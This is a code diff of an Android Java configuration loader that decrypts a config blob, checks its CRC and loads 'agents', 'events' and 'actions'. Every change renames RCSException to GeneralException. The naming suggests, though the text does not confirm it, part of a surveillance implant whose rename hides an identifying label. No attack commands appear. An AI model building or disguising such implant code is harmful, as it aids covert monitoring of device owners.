@@ -14,7 +14,7 @@ import java.nio.ByteOrder;
 import android.util.Log;
 
 import com.android.service.Debug;
-import com.android.service.RCSException;
+import com.android.service.GeneralException;
 import com.android.service.Status;
 import com.android.service.action.Action;
 import com.android.service.action.SubActionType;
@@ -98,10 +98,10 @@ public class Configuration {
 	 * Load configuration.
 	 * 
 	 * @return true, if successful
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	public boolean LoadConfiguration() throws RCSException {
+	public boolean LoadConfiguration() throws GeneralException {
 		try {
 			// Clean old configuration
 			cleanConfiguration();
@@ -121,10 +121,10 @@ public class Configuration {
 	/**
 	 * Parses the configuration.
 	 * 
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void parseConfiguration() throws RCSException {
+	private void parseConfiguration() throws GeneralException {
 		try {
 			// Parse the whole configuration
 			loadAgents();
@@ -138,7 +138,7 @@ public class Configuration {
 			Debug.StatusEvents();
 			Debug.StatusOptions();
 			// Debug checks end
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			throw rcse;
 		}
 
@@ -189,14 +189,14 @@ public class Configuration {
 	 * @param tag
 	 *            string
 	 * @return the offset where the tag ends
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private int findTag(final String tag) throws RCSException {
+	private int findTag(final String tag) throws GeneralException {
 		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
 
 		if (index == -1) {
-			throw new RCSException("Tag " + tag + " not found");
+			throw new GeneralException("Tag " + tag + " not found");
 		}
 
 		Log.d("QZ", TAG + " Tag " + tag + " found at: " + index);
@@ -206,17 +206,17 @@ public class Configuration {
 	/**
 	 * Parses configuration file and loads the agents into Status.
 	 * 
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadAgents() throws RCSException {
+	private void loadAgents() throws GeneralException {
 		int agentTag;
 
 		try {
 			// Identify agents' section
 			agentTag = findTag(AGENT_CONF_DELIMITER);
 			agentTag += AGENT_CONF_DELIMITER.length() + 1;
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			throw rcse;
 		}
 
@@ -255,17 +255,17 @@ public class Configuration {
 	/**
 	 * Parses configuration file and loads the events into Status.
 	 * 
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadEvents() throws RCSException {
+	private void loadEvents() throws GeneralException {
 		int eventTag;
 
 		try {
 			// Identify events' section
 			eventTag = findTag(EVENT_CONF_DELIMITER);
 			eventTag += EVENT_CONF_DELIMITER.length() + 1;
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			throw rcse;
 		}
 
@@ -305,10 +305,10 @@ public class Configuration {
 	/**
 	 * Load actions.
 	 * 
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadActions() throws RCSException {
+	private void loadActions() throws GeneralException {
 		final int actionNum = wrappedClearConf.getInt();
 
 		Log.d("QZ", TAG + " Number of actions " + actionNum);
@@ -342,7 +342,7 @@ public class Configuration {
 
 				status.addAction(a);
 			}
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			throw rcse;
 		}
 
@@ -352,17 +352,17 @@ public class Configuration {
 	/**
 	 * Load options.
 	 * 
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadOptions() throws RCSException {
+	private void loadOptions() throws GeneralException {
 		int optionsTag;
 
 		try {
 			// Identify agents' section
 			optionsTag = findTag(MOBIL_CONF_DELIMITER);
 			optionsTag += MOBIL_CONF_DELIMITER.length() + 1;
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			throw rcse;
 		}
 
@@ -397,10 +397,10 @@ public class Configuration {
 	 * 
 	 * @param rawConf
 	 *            the raw conf
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void decryptConfiguration(final byte[] rawConf) throws RCSException {
+	private void decryptConfiguration(final byte[] rawConf) throws GeneralException {
 		/**
 		 * Struttura del file di configurazione
 		 * 
@@ -414,7 +414,7 @@ public class Configuration {
 		try {
 
 			if (rawConf == null) {
-				throw new RCSException("Cannot allocate memory for configuration");
+				throw new GeneralException("Cannot allocate memory for configuration");
 			}
 
 			// Decrypt configuration
@@ -439,7 +439,7 @@ public class Configuration {
 			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
 
 			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
-				throw new RCSException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = "
+				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = "
 						+ crc(clearConf, 0, confClearLen));
 			}
 
